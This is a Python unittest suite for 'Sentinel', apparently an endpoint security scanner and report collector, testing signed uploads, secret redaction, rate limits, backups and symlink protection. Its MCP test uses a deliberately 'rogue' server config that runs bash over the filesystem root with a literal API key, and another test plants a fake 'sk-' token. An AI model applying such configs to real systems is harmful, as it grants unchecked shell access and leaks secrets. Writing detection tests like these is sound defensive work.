import hashlib, importlib.util, json, os, shutil, sqlite3, subprocess, tempfile, threading, time, unittest, urllib.error, urllib.request, zipfile
from pathlib import Path
from unittest.mock import patch

ROOT=Path(__file__).parents[1]; DOWNLOADS=ROOT/'public'/'downloads'
def load(name,file):
    spec=importlib.util.spec_from_file_location(name,DOWNLOADS/file); module=importlib.util.module_from_spec(spec); spec.loader.exec_module(module); return module
def vendor_report(level='normal'):
    summary={name:0 for name in ('critical','high','medium','low')}; findings=[]
    if level!='normal': summary[level]=1; findings=[{'kind':'test','severity':level,'path':'x','message':'test'}]
    return {'schema':'sentinel.report/v1','agent_version':'0.21.0','policy_version':'4.6.0','device_id':'device-123','scanned_at':1,'summary':summary,'findings':findings}

class SentinelTests(unittest.TestCase):
    def setUp(self): self.agent=load('agent','sentinel_agent.py'); self.collector=load('collector','sentinel_collector.py'); self.backup=load('backup','sentinel_collector_backup.py'); self.restore=load('restore','sentinel_collector_restore.py'); self.adapter=load('adapter','sentinel_adapter.py'); self.worker=load('adapter_worker','sentinel_adapter_worker.py'); self.verifier=load('verifier','sentinel_release_verify.py'); self.policy=json.loads((DOWNLOADS/'sentinel-policy.json').read_text())
    def test_clean_project(self):
        with tempfile.TemporaryDirectory() as d:
            report=self.agent.build_report(Path(d),self.policy)
            self.assertEqual(report['schema'],'sentinel.report/v1'); self.assertEqual(report['summary']['critical'],0)
    def test_console_does_not_claim_live_data_or_fake_task_dispatch(self):
        page=(ROOT/'app/page.tsx').read_text()
        self.assertIn('演示模式',page); self.assertIn('接收器未连接',page); self.assertIn('未对任何终端执行操作',page)
        self.assertNotIn('start_enterprise_security_scan',page); self.assertNotIn('status: \'dispatched\'',page); self.assertNotIn('系统运行正常',page); self.assertNotIn('实时上报',page); self.assertNotIn('已强制应用',page)
        route=(ROOT/'app/api/summary/route.ts').read_text(); self.assertIn("base.protocol !== 'https:'",route); self.assertIn('base.hostname.toLowerCase() !== allowedHost.toLowerCase()',route); self.assertIn('AbortSignal.timeout(5000)',route); self.assertIn("'Cache-Control': 'no-store'",route)
        self.assertIn('readBoundedJson(response)',route); self.assertIn('65_536',route); self.assertIn('await reader.cancel()',route); self.assertIn("new TextDecoder('utf-8', { fatal: true })",route); self.assertIn('sanitizedSummary',route)
        self.assertNotIn('SENTINEL_COLLECTOR_TOKEN',page); self.assertIn("fetch('/api/summary'",page)
    def test_policy_hot_reload_keeps_last_known_good_on_invalid_update(self):
        with tempfile.TemporaryDirectory() as d:
            path=Path(d)/'policy.json'; path.write_text(json.dumps(self.policy)); loaded,failed=self.agent.reload_policy(path)
            self.assertFalse(failed); self.assertEqual(loaded['version'],self.policy['version'])
            path.write_text('{broken'); retained,failed=self.agent.reload_policy(path,loaded)
            self.assertTrue(failed); self.assertIs(retained,loaded)
            path.write_text(json.dumps({'schema':'wrong','version':'9'})); retained,failed=self.agent.reload_policy(path,loaded)
            self.assertTrue(failed); self.assertIs(retained,loaded)
            path.write_text(json.dumps({**loaded,'limits':'untrusted'})); retained,failed=self.agent.reload_policy(path,loaded)
            self.assertTrue(failed); self.assertIs(retained,loaded)
            path.write_text(json.dumps({**loaded,'secret_patterns':['[invalid']})); retained,failed=self.agent.reload_policy(path,loaded)
            self.assertTrue(failed); self.assertIs(retained,loaded)
            path.write_text(json.dumps({**loaded,'allowed_mcp_invocations':[['npx','']]})); retained,failed=self.agent.reload_policy(path,loaded)
            self.assertTrue(failed); self.assertIs(retained,loaded)
            report={'findings':[{'kind':'x','severity':'low'}]*self.agent.REPORT_FINDING_LIMIT,'summary':{}}
            self.agent.add_report_finding(report,{'kind':'policy_reload_failed','severity':'high'})
            self.assertEqual(len(report['findings']),self.agent.REPORT_FINDING_LIMIT); self.assertEqual(report['findings'][-1]['kind'],'policy_reload_failed'); self.assertEqual(report['summary']['high'],1)
    def test_scan_and_report_limits_are_enforced(self):
        with tempfile.TemporaryDirectory() as d:
            root=Path(d)
            for index in range(101): (root/f'{index}.py').write_text('x=1')
            _inventory,findings=self.agent.scan(root,{**self.policy,'limits':{'project_files':100}})
            self.assertIn('project_scan_truncated',{item['kind'] for item in findings})
            fake_inventory=[{'type':'x'}]*5002; fake_findings=[{'kind':'x','severity':'low','path':'p','message':'m'}]*10002
            with patch.object(self.agent,'scan',return_value=(fake_inventory,fake_findings)):
                report=self.agent.build_report(root,self.policy)
            self.assertEqual(len(report['inventory']),5000); self.assertEqual(report['inventory'][-1]['type'],'inventory_truncated')
            self.assertEqual(len(report['findings']),10000); self.assertEqual(report['findings'][-1]['kind'],'findings_truncated')
    def test_oversized_code_config_and_skill_files_are_visible_and_bounded(self):
        policy={**self.policy,'limits':{**self.policy['limits'],'max_file_bytes':65536}}
        with tempfile.TemporaryDirectory() as d:
            root=Path(d); large=root/'app.py'; large.write_bytes(b'x'*65537)
            findings=self.agent.scan(root,policy)[1]; self.assertIn('oversized_file_skipped',{item['kind'] for item in findings})
            skill=root/'demo'; skill.mkdir(); (skill/'SKILL.md').write_text('# demo'); (skill/'large.py').write_bytes(b'x'*65537)
            skill_findings,count=self.agent.scan_skill(skill/'SKILL.md',policy,max_files=2)
            self.assertEqual(count,2); self.assertIn('oversized_file_skipped',{item['kind'] for item in skill_findings})
        self.assertEqual(self.agent.max_file_bytes({'limits':{'max_file_bytes':'bad'}}),1000000)
        self.assertEqual(self.agent.max_file_bytes({'limits':{'max_file_bytes':1}}),65536)
        windows=(DOWNLOADS/'sentinel-windows.ps1').read_text(); self.assertIn("kind='oversized_file_skipped'",windows); self.assertIn('$maxFileBytes',windows)
    def test_secret_detection_is_redacted(self):
        with tempfile.TemporaryDirectory() as d:
            p=Path(d)/'app.py'; p.write_text('token="sk-abcdefghijklmnopqrstuvwxyz123456"')
            report=self.agent.build_report(Path(d),self.policy); f=next(x for x in report['findings'] if x['kind']=='hardcoded_secret')
            self.assertEqual(f['severity'],'critical'); self.assertTrue(f['evidence'].endswith('…')); self.assertNotIn('abcdefghijklmnopqrstuvwxyz',f['evidence'])
    def test_baseline_is_additive_and_idempotent(self):
        with tempfile.TemporaryDirectory() as d:
            root=Path(d); (root/'AGENTS.md').write_text('# Existing\nkeep me')
            self.agent.install_baseline(root); self.agent.install_baseline(root)
            text=(root/'AGENTS.md').read_text(); self.assertIn('keep me',text); self.assertEqual(text.count(self.agent.MANAGED_MARKER),1); self.assertTrue((root/'.cursor/rules/sentinel-security.mdc').exists())
    def test_baseline_write_rejects_symlink_escape(self):
        with tempfile.TemporaryDirectory() as d:
            base=Path(d); root=base/'repo'; outside=base/'outside'; root.mkdir(); outside.mkdir(); (root/'.sentinel').symlink_to(outside, target_is_directory=True)
            victim=outside/'SECURITY_BASELINE.md'; victim.write_text('do not change')
            self.agent.install_baseline(root)
            self.assertEqual(victim.read_text(),'do not change')
            user=base/'user'; user.mkdir(); (user/'.codex').symlink_to(outside,target_is_directory=True); agents=outside/'AGENTS.md'; agents.write_text('personal')
            self.assertEqual(self.agent.install_user_baselines([user]),[]); self.assertEqual(agents.read_text(),'personal')
    def test_user_baseline_loads_only_for_installed_agents_and_updates_in_place(self):
        with tempfile.TemporaryDirectory() as d:
            base=Path(d); active=base/'active'; untouched=base/'untouched'; (active/'.codex').mkdir(parents=True); untouched.mkdir()
            target=active/'.codex/AGENTS.md'; target.write_text('# Personal rules\n')
            first=self.agent.install_user_baselines([active,untouched]); second=self.agent.install_user_baselines([active,untouched])
            text=target.read_text(); self.assertEqual(first,[str(target)]); self.assertEqual(second,[])
            self.assertIn('Personal rules',text); self.assertEqual(text.count(self.agent.USER_BASELINE_START),1); self.assertFalse((untouched/'.codex').exists())
        windows=(DOWNLOADS/'sentinel-windows.ps1').read_text(); remediation=(DOWNLOADS/'intune-windows-remediate.ps1').read_text(); self.assertIn('function Sync-SentinelUserBaselines',windows); self.assertIn('Sync-SentinelUserBaselines $userHomes',windows); self.assertIn("kind='malformed_user_baseline_block'",windows); self.assertIn('baseline markers malformed',remediation)
        remediation=(DOWNLOADS/'intune-windows-remediate.ps1').read_text()
        self.assertIn('sentinel-managed-user-baseline:start',remediation); self.assertIn('Test-Path $codexDir',remediation); self.assertIn('ReparsePoint',remediation)
    def test_uninstall_removes_only_managed_user_blocks(self):
        mac=(DOWNLOADS/'uninstall-sentinel-macos.sh').read_text(); windows=(DOWNLOADS/'uninstall-sentinel-windows.ps1').read_text()
        for script in (mac,windows): self.assertIn('sentinel-managed-user-baseline:start',script); self.assertIn('sentinel-managed-user-baseline:end',script)
        self.assertIn('[ ! -L "$file" ]',mac); self.assertIn('ReparsePoint',windows)
        self.assertIn('Repository rule files',mac); self.assertIn('Repository rule files',windows)
    def test_collector_contract(self):
        now=int(time.time()); report={'schema':'sentinel.report/v1','agent_version':'0.11.0','policy_version':'4.2.0','device_id':'device-123','scanned_at':now,'summary':{'critical':0,'high':0,'medium':0,'low':0},'findings':[]}
        self.assertTrue(self.collector.valid_report(report,now)); self.assertFalse(self.collector.valid_report({'schema':'other'},now))
        stale={**report,'scanned_at':now-8*86400}; self.assertFalse(self.collector.valid_report(stale,now))
        inconsistent={**report,'findings':[{'kind':'x','severity':'high','path':'x','message':'x'}]}; self.assertFalse(self.collector.valid_report(inconsistent,now))
        extra={**report,'unexpected':True}; self.assertFalse(self.collector.valid_report(extra,now))
        invalid_inventory={**report,'inventory':['not-an-object']}; self.assertFalse(self.collector.valid_report(invalid_inventory,now))
        oversized_inventory={**report,'inventory':[{}]*5001}; self.assertFalse(self.collector.valid_report(oversized_inventory,now))
        oversized_version={**report,'agent_version':'x'*65}; self.assertFalse(self.collector.valid_report(oversized_version,now))
        oversized_finding={**report,'summary':{'critical':0,'high':1,'medium':0,'low':0},'findings':[{'kind':'x','severity':'high','path':'p','message':'x'*2049}]}; self.assertFalse(self.collector.valid_report(oversized_finding,now))
        schema=json.loads((DOWNLOADS/'sentinel-report.schema.json').read_text())
        self.assertEqual(schema['properties']['inventory']['maxItems'],5000); self.assertEqual(schema['properties']['findings']['maxItems'],10000)
        self.assertFalse(schema['properties']['findings']['items']['additionalProperties'])
    def test_collector_database_deduplication_support(self):
        with tempfile.TemporaryDirectory() as d:
            path=Path(d)/'reports.db'
            with self.collector.db_open(path) as db:
                first=db.execute("INSERT OR IGNORE INTO reports(report_hash,device_id,received_at,severity,body) VALUES(?,?,?,?,?)",('abc','device-123',1,'normal','{}'))
                second=db.execute("INSERT OR IGNORE INTO reports(report_hash,device_id,received_at,severity,body) VALUES(?,?,?,?,?)",('abc','device-123',1,'normal','{}'))
                self.assertEqual(first.rowcount,1); self.assertEqual(second.rowcount,0)
    def test_collector_audit_is_structured_bounded_and_contains_no_report_body(self):
        with tempfile.TemporaryDirectory() as d:
            path=Path(d)/'reports.db'; report={'device_id':'device-a','summary':{'critical':0,'high':1}}; secret_body=b'{"sensitive_path":"/Users/alice/private"}'
            self.collector.store_report(path,secret_body,report,now=100)
            self.collector.store_report(path,secret_body,report,now=101)
            events=self.collector.recent_audit(path)
            self.assertEqual([event['event'] for event in events],['report_duplicate','report_accepted'])
            self.assertNotIn('sensitive_path',json.dumps(events)); self.assertNotIn('/Users/alice',json.dumps(events))
            with self.collector.db_open(path) as db:
                for index in range(1005): db.execute("INSERT INTO audit_events(event,occurred_at) VALUES(?,?)",('test',200+index))
                self.collector.prune_audit(db,now=2000,days=90,max_events=1000); db.commit()
                self.assertEqual(db.execute("SELECT COUNT(*) FROM audit_events").fetchone()[0],1000)
        self.assertEqual(self.collector.audit_retention_days('bad'),90); self.assertEqual(self.collector.audit_max_events(5),1000)
    def test_collector_semantic_deduplication_ignores_json_formatting(self):
        with tempfile.TemporaryDirectory() as d:
            path=Path(d)/'reports.db'; report={'schema':'sentinel.report/v1','agent_version':'0.11.0','policy_version':'4.2.0','device_id':'device-123','scanned_at':1,'summary':{'critical':0,'high':0,'medium':0,'low':0},'findings':[]}
            compact=json.dumps(report,separators=(',',':')).encode(); pretty=json.dumps(report,indent=2,sort_keys=True).encode()
            first=self.collector.store_report(path,compact,report,now=1); second=self.collector.store_report(path,pretty,report,now=1)
            self.assertFalse(first['duplicate']); self.assertTrue(second['duplicate']); self.assertNotEqual(first['report_id'],second['report_id'])
    def test_collector_retention_and_storage(self):
        with tempfile.TemporaryDirectory() as d:
            path=Path(d)/'reports.db'; now=10*86400
            with self.collector.db_open(path) as db: db.execute("INSERT INTO reports(report_hash,device_id,received_at,severity,body) VALUES(?,?,?,?,?)",('old','device-old',1,'normal','{}')); db.commit()
            report={'device_id':'device-new','summary':{'critical':0,'high':0}}; body=b'{"new":true}'
            result=self.collector.store_report(path,body,report,now=now,days=2); self.assertFalse(result['duplicate'])
            with self.collector.db_open(path) as db: self.assertEqual(db.execute("SELECT COUNT(*) FROM reports").fetchone()[0],1)
        self.assertEqual(self.collector.retention_days('invalid'),30); self.assertEqual(self.collector.retention_days(99999),3650)
    def test_collector_summary_uses_latest_report_per_device(self):
        with tempfile.TemporaryDirectory() as d:
            path=Path(d)/'reports.db'; now=200000
            with self.collector.db_open(path) as db:
                rows=[('a1','device-a',now-90000,'critical','{}'),('a2','device-a',now-10,'normal','{}'),('b1','device-b',now-20,'high','{}'),('c1','device-c',now-90000,'critical','{}')]
                db.executemany("INSERT INTO reports(report_hash,device_id,received_at,severity,body) VALUES(?,?,?,?,?)",rows); db.commit()
            summary=self.collector.collector_summary(path,now=now)
            self.assertEqual(summary['total_devices'],3); self.assertEqual(summary['active_devices'],2); self.assertEqual(summary['stale_devices'],1)
            self.assertEqual(summary['latest_severity'],{'critical':1,'high':1,'normal':1})
            self.assertEqual(summary['version_posture'],{'current':0,'agent_mismatch':0,'policy_mismatch':0,'both_mismatch':0,'unknown':3})
    def test_collector_summary_classifies_latest_version_drift(self):
        with tempfile.TemporaryDirectory() as d:
            path=Path(d)/'reports.db'; now=200000
            versions=[('current','0.25.0','4.8.0'),('agent','0.24.0','4.8.0'),('policy','0.25.0','4.7.0'),('both','0.24.0','4.7.0')]
            for device,agent,policy in versions:
                report={'device_id':device,'agent_version':agent,'policy_version':policy,'summary':{'critical':0,'high':0}}; self.collector.store_report(path,b'{}',report,now=now)
            summary=self.collector.collector_summary(path,now=now,required_agent='0.25.0',required_policy='4.8.0')
            self.assertEqual(summary['version_posture'],{'current':1,'agent_mismatch':1,'policy_mismatch':1,'both_mismatch':1,'unknown':0})
            self.assertEqual(summary['required_agent_version'],'0.25.0'); self.assertEqual(summary['required_policy_version'],'4.8.0')
            with self.collector.db_open(path) as db: self.assertTrue({'agent_version','policy_version'}.issubset({row[1] for row in db.execute('PRAGMA table_info(reports)')}))
    def test_collector_online_backup_is_consistent_private_and_retained(self):
        with tempfile.TemporaryDirectory() as d:
            root=Path(d); source=root/'sentinel.db'; output=root/'backups'
            with self.collector.db_open(source) as db:
                db.execute("INSERT INTO reports(report_hash,device_id,received_at,severity,body) VALUES(?,?,?,?,?)",('one','device-a',1,'normal','{}')); db.commit()
            first=self.backup.backup_database(source,output,keep=1,now=1)
            self.assertTrue(self.backup.quick_check(first)); self.assertEqual(first.stat().st_mode & 0o777,0o600)
            second=self.backup.backup_database(source,output,keep=1,now=2)
            self.assertTrue(second.exists()); self.assertFalse(first.exists()); self.assertEqual(len(list(output.glob('sentinel-backup-*.sqlite'))),1)
            db=sqlite3.connect(second)
            try: self.assertEqual(db.execute("SELECT COUNT(*) FROM reports").fetchone()[0],1)
            finally: db.close()
        self.assertEqual(self.backup.keep_count('invalid'),14); self.assertEqual(self.backup.keep_count(999),365)
    def test_collector_restore_candidate_is_verified_private_and_non_overwriting(self):
        with tempfile.TemporaryDirectory() as d:
            root=Path(d); source=root/'sentinel.db'; backups=root/'backups'; restored=root/'restore/candidate.db'
            with self.collector.db_open(source) as db:
                db.execute("INSERT INTO reports(report_hash,device_id,received_at,severity,body) VALUES(?,?,?,?,?)",('one','device-a',1,'high','{}')); db.commit()
            backup=self.backup.backup_database(source,backups)
            candidate=self.restore.restore_candidate(backup,restored)
            self.assertTrue(self.backup.quick_check(candidate)); self.assertEqual(candidate.stat().st_mode & 0o777,0o600)
            db=sqlite3.connect(candidate)
            try: self.assertEqual(db.execute("SELECT device_id,severity FROM reports").fetchone(),('device-a','high'))
            finally: db.close()
            with self.assertRaises(FileExistsError): self.restore.restore_candidate(backup,restored)
    def test_collector_rate_limiter_is_bounded_and_recovers(self):
        now=[100.0]; limiter=self.collector.RateLimiter(limit=2,window=60,max_sources=2,clock=lambda:now[0])
        self.assertEqual(limiter.check('client-a'),(True,0)); self.assertEqual(limiter.check('client-a'),(True,0))
        allowed,retry=limiter.check('client-a'); self.assertFalse(allowed); self.assertEqual(retry,60)
        limiter.check('client-b'); limiter.check('client-c'); self.assertLessEqual(len(limiter.events),2)
        now[0]=161; self.assertEqual(limiter.check('client-a'),(True,0))
        self.assertEqual(self.collector.requests_per_minute('invalid'),120); self.assertEqual(self.collector.requests_per_minute(99999),10000)
    def test_collector_http_rate_limit_contract(self):
        with tempfile.TemporaryDirectory() as d, patch.dict(os.environ,{'SENTINEL_COLLECTOR_TOKEN':'bearer'}):
            server=self.collector.ThreadingHTTPServer(('127.0.0.1',0),self.collector.Handler); server.db_path=str(Path(d)/'reports.db'); server.rate_limiter=self.collector.RateLimiter(limit=1)
            thread=threading.Thread(target=server.serve_forever,daemon=True); thread.start()
            try:
                url=f'http://127.0.0.1:{server.server_port}/v1/devices'; request=urllib.request.Request(url,headers={'Authorization':'Bearer bearer'})
                with urllib.request.urlopen(request,timeout=3) as response: self.assertEqual(response.status,200)
                with self.assertRaises(urllib.error.HTTPError) as error: urllib.request.urlopen(request,timeout=3)
                self.assertEqual(error.exception.code,429); self.assertTrue(error.exception.headers['Retry-After']); error.exception.close()
            finally: server.shutdown(); server.server_close(); thread.join(timeout=3)
    def test_signed_report_request_contract(self):
        body=b'{"device":"test"}'; headers=self.agent.report_headers(body,'bearer','signing-secret',now=1000)
        self.assertTrue(self.collector.valid_signature(headers,body,now=1001,secret='signing-secret'))
        self.assertFalse(self.collector.valid_signature(headers,body+b'x',now=1001,secret='signing-secret'))
        self.assertFalse(self.collector.valid_signature(headers,body,now=1301,secret='signing-secret'))
        self.assertEqual(headers['Authorization'],'Bearer bearer'); self.assertTrue(headers['X-Sentinel-Signature'].startswith('sha256='))
        bound=self.agent.report_headers(body,'bearer','signing-secret',now=1000,device_id='abcdef123456'); self.assertTrue(self.collector.valid_signature(bound,body,now=1001,secret='signing-secret')); self.assertFalse(self.collector.valid_signature({**bound,'X-Sentinel-Device-ID':'000000000000'},body,now=1001,secret='signing-secret'))
    def test_collector_binds_device_identity_to_independent_credentials(self):
        with tempfile.TemporaryDirectory() as d:
            root=Path(d); credentials_path=root/'devices.json'; device_id='abcdef123456'; token='t'*32; secret='s'*32; admin='a'*32
            credentials_path.write_text(json.dumps({'schema':'sentinel.device-credentials/v1','devices':{device_id:{'tokens':[token],'signing_secrets':[secret]}}})); credentials_path.chmod(0o600)
            self.assertEqual(set(self.collector.device_credentials(credentials_path)),{device_id})
            env={'SENTINEL_COLLECTOR_TOKEN':admin,'SENTINEL_DEVICE_CREDENTIALS_FILE':str(credentials_path)}
            self.assertEqual(self.collector.runtime_secret_errors(env),[])
            with patch.dict(os.environ,env,clear=True):
                server=self.collector.ThreadingHTTPServer(('127.0.0.1',0),self.collector.Handler); server.db_path=str(root/'reports.db'); thread=threading.Thread(target=server.serve_forever,daemon=True); thread.start()
                try:
                    now=int(time.time()); report={'schema':'sentinel.report/v1','agent_version':'0.30.0','policy_version':'4.8.0','device_id':device_id,'scanned_at':now,'summary':{'critical':0,'high':0,'medium':0,'low':0},'findings':[]}; body=json.dumps(report).encode(); url=f'http://127.0.0.1:{server.server_port}/v1/reports'
                    headers=self.agent.report_headers(body,token,secret,now=now,device_id=device_id); request=urllib.request.Request(url,data=body,headers=headers,method='POST')
                    with urllib.request.urlopen(request,timeout=3) as response: self.assertEqual(response.status,202)
                    wrong={**report,'device_id':'000000000000'}; wrong_body=json.dumps(wrong).encode(); headers=self.agent.report_headers(wrong_body,token,secret,now=now,device_id=device_id); request=urllib.request.Request(url,data=wrong_body,headers=headers,method='POST')
                    with self.assertRaises(urllib.error.HTTPError) as error: urllib.request.urlopen(request,timeout=3)
                    self.assertEqual(error.exception.code,401); error.exception.close()
                finally: server.shutdown(); server.server_close(); thread.join(timeout=3)
            credentials_path.chmod(0o644)
            with self.assertRaisesRegex(ValueError,'device_credentials_permissions'): self.collector.device_credentials(credentials_path)
            credentials_path.chmod(0o600); credentials_path.write_text(json.dumps({'schema':'sentinel.device-credentials/v1','devices':{device_id:{'tokens':[token],'signing_secrets':[secret]},'000000000000':{'tokens':[token],'signing_secrets':['x'*32]}}}))
            with self.assertRaisesRegex(ValueError,'device_credentials_not_independent'): self.collector.device_credentials(credentials_path)
    def test_endpoint_requires_strict_bounded_collector_acknowledgement(self):
        report=vendor_report(); expected=hashlib.sha256(json.dumps(report,ensure_ascii=False).encode()).hexdigest()[:20]; valid={'accepted':True,'duplicate':False,'report_id':expected,'severity':'normal'}
        class Response:
            status=202
            def __init__(self,body): self.body=body
            def __enter__(self): return self
            def __exit__(self,*args): pass
            def read(self,limit): return self.body[:limit]
        with patch.object(self.agent.urllib.request,'urlopen',return_value=Response(json.dumps(valid).encode())): self.assertEqual(self.agent.post_report('https://collector.invalid/v1/reports','token',report,'secret'),valid)
        for body,error in ((b'', 'collector_ack_invalid_json'),(json.dumps({**valid,'extra':True}).encode(),'collector_ack_invalid_contract'),(json.dumps({**valid,'report_id':'a'*20}).encode(),'collector_ack_invalid_contract'),(b'x'*4097,'collector_ack_too_large')):
            with patch.object(self.agent.urllib.request,'urlopen',return_value=Response(body)),self.assertRaisesRegex(OSError,error): self.agent.post_report('https://collector.invalid/v1/reports','token',report,'secret')
        windows=(DOWNLOADS/'sentinel-windows.ps1').read_text(); self.assertIn('Collector acknowledgement contract is invalid',windows); self.assertIn("accepted,duplicate,report_id,severity",windows); self.assertIn('$ackBytes -gt 4096',windows)
    def test_reporting_config_requires_private_file_and_strict_contract(self):
        with tempfile.TemporaryDirectory() as d:
            root=Path(d); path=root/'reporting.json'; value={'schema':'sentinel.reporting/v1','report_url':'https://collector.example.internal/v1/reports','report_token':'t'*32,'signing_secret':'s'*32}
            path.write_text(json.dumps(value)); path.chmod(0o600); self.assertEqual(self.agent.load_reporting_config(path),value)
            path.chmod(0o644)
            with self.assertRaisesRegex(ValueError,'reporting_config_permissions'): self.agent.load_reporting_config(path)
            path.chmod(0o600); link=root/'link.json'; link.symlink_to(path)
            with self.assertRaisesRegex(ValueError,'reporting_config_symlink'): self.agent.load_reporting_config(link)
            path.write_text(json.dumps({**value,'report_url':'https://collector.example.internal/v1/reports?token=bad'}))
            with self.assertRaisesRegex(ValueError,'reporting_config_url'): self.agent.load_reporting_config(path)
            path.write_text(json.dumps({**value,'signing_secret':'t'*32}))
            with self.assertRaisesRegex(ValueError,'reporting_config_secrets'): self.agent.load_reporting_config(path)
            status=root/'upload-status.json'; self.agent.write_upload_status(status,'https://Collector.Example.Internal/v1/reports',now=123)
            self.assertEqual(json.loads(status.read_text()),{'schema':'sentinel.upload-status/v1','status':'accepted','last_success':123,'collector_host':'collector.example.internal'}); self.assertEqual(status.stat().st_mode&0o777,0o600)
        windows=(DOWNLOADS/'sentinel-configure-windows.ps1').read_text(); scanner=(DOWNLOADS/'sentinel-windows.ps1').read_text(); mac=(DOWNLOADS/'sentinel-configure-macos.sh').read_text()
        self.assertIn('DataProtectionScope]::LocalMachine',windows); self.assertIn('ProtectedData]::Unprotect',scanner); self.assertIn("kind='reporting_config_invalid'",scanner); self.assertIn('umask 077',mac)
    def test_collector_supports_bounded_token_and_signing_key_rotation(self):
        body=b'{"device":"test"}'; old=self.agent.report_headers(body,'old-token','old-signing',now=1000); new=self.agent.report_headers(body,'new-token','new-signing',now=1000)
        env={'SENTINEL_REPORT_SIGNING_SECRETS':'["new-signing","old-signing"]'}
        with patch.dict(os.environ,env,clear=True):
            self.assertTrue(self.collector.valid_signature(old,body,now=1000)); self.assertTrue(self.collector.valid_signature(new,body,now=1000))
        self.assertEqual(self.collector.secret_values('ONE','MANY',{'ONE':'legacy'}),['legacy'])
        self.assertEqual(self.collector.secret_values('ONE','MANY',{'MANY':'["new","old"]'}),['new','old'])
        self.assertEqual(self.collector.secret_values('ONE','MANY',{'MANY':'not-json'}),[])
        self.assertEqual(self.collector.secret_values('ONE','MANY',{'MANY':json.dumps(['x']*6)}),[])
        handler=object.__new__(self.collector.Handler); handler.headers={'Authorization':'Bearer old-token'}
        with patch.dict(os.environ,{'SENTINEL_COLLECTOR_TOKENS':'["new-token","old-token"]'},clear=True): self.assertTrue(handler.authorized())
    def test_collector_runtime_secrets_require_strength_uniqueness_and_separation(self):
        good={'SENTINEL_COLLECTOR_TOKENS':json.dumps(['t'*32,'u'*32]),'SENTINEL_REPORT_SIGNING_SECRETS':json.dumps(['s'*32,'v'*32])}
        self.assertEqual(self.collector.runtime_secret_errors(good),[])
        weak={'SENTINEL_COLLECTOR_TOKEN':'short','SENTINEL_REPORT_SIGNING_SECRET':'tiny'}
        self.assertTrue({'collector_token_too_short','signing_secret_too_short'}.issubset(self.collector.runtime_secret_errors(weak)))
        reused={'SENTINEL_COLLECTOR_TOKEN':'x'*32,'SENTINEL_REPORT_SIGNING_SECRET':'x'*32}
        self.assertIn('authentication_and_signing_secret_reused',self.collector.runtime_secret_errors(reused))
        duplicate={'SENTINEL_COLLECTOR_TOKENS':json.dumps(['a'*32,'a'*32]),'SENTINEL_REPORT_SIGNING_SECRET':'b'*32}
        self.assertIn('collector_token_duplicate',self.collector.runtime_secret_errors(duplicate))
        pilot={'SENTINEL_COLLECTOR_TOKEN':'a'*32,'SENTINEL_ALLOW_UNSIGNED_REPORTS':'true'}
        self.assertEqual(self.collector.runtime_secret_errors(pilot),[])
    def test_unsigned_reports_are_denied_unless_explicitly_enabled(self):
        with patch.dict(os.environ,{},clear=True): self.assertFalse(self.collector.valid_signature({},b'body',now=1,secret=''))
        with patch.dict(os.environ,{'SENTINEL_ALLOW_UNSIGNED_REPORTS':'true'},clear=True): self.assertTrue(self.collector.valid_signature({},b'body',now=1,secret=''))
        self.assertFalse(self.collector.allow_unsigned_reports('false')); self.assertTrue(self.collector.allow_unsigned_reports('yes'))
    def test_collector_http_accepts_signed_report_and_deduplicates(self):
        with tempfile.TemporaryDirectory() as d, patch.dict(os.environ,{'SENTINEL_COLLECTOR_TOKEN':'bearer','SENTINEL_REPORT_SIGNING_SECRET':'signing-secret'}):
            server=self.collector.ThreadingHTTPServer(('127.0.0.1',0),self.collector.Handler); server.db_path=str(Path(d)/'reports.db')
            thread=threading.Thread(target=server.serve_forever,daemon=True); thread.start()
            try:
                now=int(time.time()); report={'schema':'sentinel.report/v1','agent_version':'0.11.0','policy_version':'4.2.0','device_id':'device-http','scanned_at':now,'summary':{'critical':0,'high':0,'medium':0,'low':0},'findings':[]}; body=json.dumps(report).encode()
                headers=self.agent.report_headers(body,'bearer','signing-secret',now=now); request=urllib.request.Request(f'http://127.0.0.1:{server.server_port}/v1/reports',data=body,headers=headers,method='POST')
                with urllib.request.urlopen(request,timeout=3) as response:
                    self.assertEqual(response.status,202); accepted=json.load(response); self.assertFalse(accepted['duplicate']); self.assertEqual(accepted['report_id'],hashlib.sha256(body).hexdigest()[:20])
                request=urllib.request.Request(f'http://127.0.0.1:{server.server_port}/v1/reports',data=body,headers=headers,method='POST')
                with urllib.request.urlopen(request,timeout=3) as response:
                    self.assertEqual(response.status,200); duplicate=json.load(response); self.assertTrue(duplicate['duplicate']); self.assertEqual(duplicate['report_id'],hashlib.sha256(body).hexdigest()[:20])
                tampered=body+b' '; request=urllib.request.Request(f'http://127.0.0.1:{server.server_port}/v1/reports',data=tampered,headers=headers,method='POST')
                with self.assertRaises(urllib.error.HTTPError) as error: urllib.request.urlopen(request,timeout=3)
                self.assertEqual(error.exception.code,401); error.exception.close()
                summary_request=urllib.request.Request(f'http://127.0.0.1:{server.server_port}/v1/summary',headers={'Authorization':'Bearer bearer'})
                with urllib.request.urlopen(summary_request,timeout=3) as response:
                    summary=json.load(response); self.assertEqual(summary['total_devices'],1); self.assertEqual(summary['active_devices'],1)
                audit_request=urllib.request.Request(f'http://127.0.0.1:{server.server_port}/v1/audit',headers={'Authorization':'Bearer bearer'})
                with urllib.request.urlopen(audit_request,timeout=3) as response:
                    events=json.load(response)['events']; self.assertIn('audit_read',{event['event'] for event in events}); self.assertIn('report_accepted',{event['event'] for event in events})
            finally: server.shutdown(); server.server_close(); thread.join(timeout=3)
    def test_mcp_least_privilege(self):
        config={'mcpServers':{'rogue':{'command':'bash','args':['/'],'env':{'API_KEY':'literal-secret'},'url':'http://outside.invalid'}}}
        findings=self.agent.scan_mcp_config(Path('/tmp/mcp.json'),json.dumps(config),self.policy)
        kinds={f['kind'] for f in findings}
        self.assertTrue({'unknown_mcp','unapproved_mcp_command','broad_filesystem_scope','literal_mcp_secret','insecure_mcp_transport'}.issubset(kinds))
        secret=next(f for f in findings if f['kind']=='literal_mcp_secret'); self.assertEqual(secret['evidence'],'[REDACTED]')
    def test_malformed_deep_json_and_policy_regex_do_not_crash_scan(self):
        deep='['*2000+'0'+']'*2000
        mcp=self.agent.scan_mcp_config(Path('/tmp/mcp.json'),deep,self.policy)
        dependency=self.agent.scan_dependency_manifest(Path('/tmp/package.json'),deep)
        regex=self.agent.scan_text(Path('/tmp/app.py'),'safe',{**self.policy,'secret_patterns':['[invalid']})
        self.assertEqual(mcp[0]['kind'],'invalid_mcp_config'); self.assertEqual(dependency[0]['kind'],'invalid_dependency_manifest')
        invalid=next(item for item in regex if item['kind']=='invalid_policy_regex'); self.assertRegex(invalid['evidence'],r'^[0-9a-f]{12}$')
